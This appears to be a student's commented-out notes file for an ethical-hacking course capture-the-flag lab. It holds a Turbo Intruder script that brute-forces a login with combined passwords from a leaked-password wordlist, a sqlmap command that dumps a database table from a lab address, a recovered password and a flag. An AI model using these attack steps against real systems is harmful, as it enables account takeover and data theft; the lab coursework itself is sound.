# import itertools


# # Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
# def queueRequests(target, wordlists):
#     engine = RequestEngine(
#         endpoint=target.endpoint,
#         concurrentConnections=10,
#         requestsPerConnection=100,
#         pipeline=False,
#         engine=Engine.THREADED,
#     )

#     with open('/Users/aleksandervestlund/Desktop/Komtek/Semester7/TTM4536/advanced-ethical-hacking/darkly/xato-net-10-million-passwords-10000.txt') as file:
#         words = file.read().splitlines()[999:2001]

#     start_index = 683390
#     end_index = start_index + 10

#     passwords = ("".join(elem) for elem in itertools.product(words, repeat=2))
#     chunk = itertools.islice(passwords, start_index, end_index)

#     #last = "12345678camila"
#     #last in chunk
#     #engine.queue(target.req, last)

#     for word in chunk:
#         engine.queue(target.req, word)


# def handleResponse(req, interesting):
#     if "flag" in req.response:
#         table.add(req)


# sqlmap -u "http://10.100.52.65:20930/?page=member&id=100&Submit=Submit#" -D Member_Brute_Force -T db_default --dump --flush-session
# password: onelovebigman
FLAG01 = "651fc3e633255fe2ef606da894ac218d"
